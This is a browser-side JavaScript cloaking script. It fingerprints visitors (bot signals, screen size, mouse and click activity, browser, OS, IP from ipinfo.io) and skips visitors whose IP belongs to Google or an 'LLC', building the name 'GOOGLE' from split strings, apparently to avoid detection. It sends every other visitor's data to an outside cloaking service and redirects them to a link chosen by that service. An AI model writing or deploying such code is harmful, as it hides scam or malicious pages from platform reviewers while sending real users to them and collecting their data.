
let webdrive = '';
    if (!('ontouchstart' in window) && !navigator.webdriver) {
        webdrive = 'false'
    }
    var referer = document.referrer;
    const currentTime = new Date().getTime();
    const isWebDriver = typeof window.navigator.webdriver === 'boolean';
    var pageLoadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    // Get screen resolution
    var screenWidth = window.screen.width;
    var screenHeight = window.screen.height;

    // Get browser window size
    var windowWidth = window.innerWidth;
    var windowHeight = window.innerHeight;


    // Get time on page and time on site
    var startTime = new Date();
    var timeOnPage = 0;
    var timeOnSite = 0;
    setInterval(function () {
        timeOnPage = new Date() - startTime;
        timeOnSite = timeOnPage; // assuming this script is included on all pages of the site
    }, 100);


    let clicks = false;
    // Track clicks and mouse movements
    document.addEventListener("click", function () {
        clicks = true;
    });
    let mouseMove = false;
    document.addEventListener("mousemove", function () {
        mouseMove = true
    });
    // Check if the screen resolution is lower than some arbitrary value (suggesting a headless browser)

    let screenSizeResolution = 0;
    if (screenResolution < "1024x768") {
        screenSizeResolution = true;
    }

    // Log all information to the console

    let obj = {};

    obj.screenResolution = "Screen Resolution: " + screenWidth + "x" + screenHeight
    obj.windowSize = windowWidth + "x" + windowHeight;
    obj.timeOnPage = "Time on Page: " + timeOnPage + "ms";
    obj.timeOnSite = "Time on Site: " + timeOnSite + "ms";
    obj.timeOnPage = "Time on Page: " + timeOnPage + "ms";
    obj.screenResolution = " " + screenResolution + "";
    obj.referrer = referer;
    obj.mouseMove = mouseMove;
    obj.click = clicks;


    if (typeof jQuery === 'undefined') {
        var script = document.createElement('script');
        script.src = "https://code.jquery.com/jquery-3.4.1.min.js";
    }
    window.onload = function () {
        $.getScript('https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.4/mobile-detect.min.js', function () {


                var md = new MobileDetect(window.navigator.userAgent);
                var isMobile = md.mobile() ? true : false;

                $.getScript('https://unpkg.com/bowser@2.7.0/es5.js', function () {
                    var browsers = bowser.getParser(window.navigator.userAgent);
                    var referer = document.referrer;
                    let browserName = browsers.parsedResult.browser.name;
                    let os = browsers.parsedResult.os.name;
                    var request_uri = window.location.href;
                    var language = window.navigator.userLanguage || window.navigator.language;
                    $.get("https://ipinfo.io", function (response) {
                        let g = 'GOO';
                        let s = g + "GLE";
                        if (response.org.toUpperCase().indexOf(s) !== -1 || response.org.toUpperCase().indexOf("LLC") !== -1) {
                            return '';
                        } else {
                            var browserLang = navigator.language.substr(0, 2);
let mobileee,desktooop;
                            if(isMobile){
                                mobileee = true ;
                                desktooop = false;
                            } else {
                                desktooop = true ;
                                mobileee = false;
                            }

                            var postData = {
                                referer_domain: referer,
                                browser_lang: browserLang,
                                browser: browserName,
                                device: os,
                                ip_location: response.country,
                                ip: response.ip,
                                is_mobile: mobileee,
                                is_desktop: desktooop,
                                is_robot: 'js',
                                robot_name: 'js',
                                log: JSON.stringify(obj),
                                link: request_uri,
                                ajax: '1'
                            };

                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', 'https://xcloaker.com/api/v1/cloaker', true);
                            xhr.setRequestHeader('Content-Type', 'application/json');
                            xhr.onreadystatechange = function () {
                                if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                                    var response = JSON.parse(xhr.responseText);
                                    window.location.href = response.link;
                                }
                            };
                            xhr.send(JSON.stringify(postData));

                        }


                    }, "json")


                });
            }
        )
    }
    ;
